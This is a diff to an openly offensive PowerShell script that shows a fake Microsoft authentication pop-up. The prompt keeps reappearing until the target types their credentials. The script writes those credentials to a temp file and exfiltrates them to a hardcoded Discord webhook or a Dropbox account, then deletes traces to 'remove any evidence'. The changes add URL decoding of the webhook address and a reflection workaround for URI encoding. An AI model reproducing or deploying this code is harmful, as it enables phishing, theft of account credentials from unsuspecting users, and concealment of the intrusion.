@@ -19,16 +19,16 @@
 
 <#
 .SYNOPSIS
-	This script is meant to trick your target into sharing their credentials through a fake authentication pop up message
+    This script is meant to trick your target into sharing their credentials through a fake authentication pop up message
 
 .DESCRIPTION 
-	A pop up box will let the target know "Unusual sign-in. Please authenticate your Microsoft Account"
-	This will be followed by a fake authentication ui prompt. 
-	If the target tried to "X" out, hit "CANCEL" or while the password box is empty hit "OK" the prompt will continuously re pop up 
-	Once the target enters their credentials their information will be uploaded to either your Dropbox or Discord webhook for collection
+    A pop up box will let the target know "Unusual sign-in. Please authenticate your Microsoft Account"
+    This will be followed by a fake authentication ui prompt. 
+    If the target tried to "X" out, hit "CANCEL" or while the password box is empty hit "OK" the prompt will continuously re pop up 
+    Once the target enters their credentials their information will be uploaded to either your Dropbox or Discord webhook for collection
 
 .Link
-	https://developers.dropbox.com/oauth-guide		# Guide for setting up your DropBox for uploads
+    https://developers.dropbox.com/oauth-guide      # Guide for setting up your DropBox for uploads
 
 #>
 
@@ -36,6 +36,8 @@
 # This is for if you want to host your own version of the script
 
 # $db = "YOUR-DROPBOX-ACCESS-TOKEN"
+cls
+Add-Type -AssemblyName System.Web
 
 $dc = "https%3A%2F%2Fdiscord.com%2Fapi%2Fwebhooks%2F1061414789290655774%2FbSd67uSbHdMuwylXDYVRqOFt7wSjbc5IEe4pki_8zYxh79GUCepE9gGVRBaF_-Vww0RH"
 
@@ -48,8 +50,26 @@ $FileName = "$env:USERNAME-$(get-date -f yyyy-MM-dd_hh-mm)_User-Creds.txt"
 <#
 
 .NOTES 
-	This is to generate the ui.prompt you will use to harvest their credentials
+    This is to generate the ui.prompt you will use to harvest their credentials
 #>
+
+function CreateUriWithoutIncorrectSlashEncoding {
+    param(
+        [Parameter(Mandatory)][string]$uri
+    )
+
+    $newUri = New-Object System.Uri $uri
+
+    [void]$newUri.PathAndQuery # need to access PathAndQuery (presumably modifies internal state)
+    $flagsFieldInfo = $newUri.GetType().GetField("m_Flags", [System.Reflection.BindingFlags]::Instance -bor [System.Reflection.BindingFlags]::NonPublic)
+    $flags = $flagsFieldInfo.GetValue($newUri)
+    $flags = $flags -band (-bnot 0x30) # remove Flags.PathNotCanonical|Flags.QueryNotCanonical (private enum)
+    $flagsFieldInfo.SetValue($newUri, $flags)
+
+    $newUri
+}
+
+
 
 function Get-Creds {
 
@@ -79,7 +99,7 @@ while ($form -eq $null)
 <#
 
 .NOTES 
-	This is to pause the script until a mouse movement is detected
+    This is to pause the script until a mouse movement is detected
 #>
 
 function Pause-Script{
@@ -118,7 +138,7 @@ $key.SendKeys('{CapsLock}')
 <#
 
 .NOTES 
-	This is to call the function to pause the script until a mouse movement is detected then activate the pop-up
+    This is to call the function to pause the script until a mouse movement is detected then activate the pop-up
 #>
 
 Pause-Script
@@ -140,7 +160,7 @@ $creds = Get-Creds
 <#
 
 .NOTES 
-	This is to save the gathered credentials to a file in the temp directory
+    This is to save the gathered credentials to a file in the temp directory
 #>
 
 echo $creds >> $env:TMP\$FileName
@@ -150,14 +170,14 @@ echo $creds >> $env:TMP\$FileName
 <#
 
 .NOTES 
-	This is to upload your files to dropbox
+    This is to upload your files to dropbox
 #>
 
 function DropBox-Upload {
 
 [CmdletBinding()]
 param (
-	
+    
 [Parameter (Mandatory = $True, ValueFromPipeline = $True)]
 [Alias("f")]
 [string]$SourceFilePath
@@ -187,7 +207,11 @@ param (
     [string]$text 
 )
 
-$hookurl = "$dc"
+$urlTodDecode = $dc
+$decodedURL = [System.Web.HttpUtility]::UrlDecode($urlTodDecode)
+#Decode URL code ends here.
+
+$hookurl = "$decodedURL"
 
 $Body = @{
   'username' = $env:username
@@ -207,7 +231,7 @@ if (-not ([string]::IsNullOrEmpty($dc))){Upload-Discord -file $env:TMP\$FileName
 <#
 
 .NOTES 
-	This is to clean up behind you and remove any evidence to prove you were there
+    This is to clean up behind you and remove any evidence to prove you were there
 #>
 
 # Delete contents of Temp folder 
